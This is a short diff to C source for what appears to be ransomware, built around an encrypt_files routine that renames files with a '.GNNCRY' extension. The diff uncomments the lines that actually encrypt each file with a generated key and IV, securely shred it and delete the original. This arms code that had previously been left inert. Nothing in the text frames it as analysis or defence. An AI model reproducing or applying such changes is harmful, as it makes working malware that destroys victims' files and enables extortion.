@@ -38,19 +38,19 @@ void encrypt_files(List *files, List **encrypted, List **not_encrypted){
             new_name = (char*) malloc(sizeof(char) * (strlen(files->info[2]) + 11));
             strcpy(new_name, files->info[2]);
             strcat(new_name, ".GNNCRY");
-            //new = fopen(new_name, "wb");
+            new = fopen(new_name, "wb");
 
             iv = generate_key(16);
             key = generate_key(32);
 
             /* Where encryption really happens*/
-            //encrypt(old, new, key, iv);
+            encrypt(old, new, key, iv);
             append(encrypted, new_name, key, iv);
-            //fclose(new);
+            fclose(new);
             fclose(old);
             free(key);
             free(iv);
-            //shred(files->info[2]);
+            shred(files->info[2]);
 
         }else    append(not_encrypted, files->info[2], NULL, NULL);
 
@@ -136,7 +136,7 @@ void shred(char *path){
     if (ret == -1)
         return;
 
-    //remove(path);
+    remove(path);
 }
 
 /**
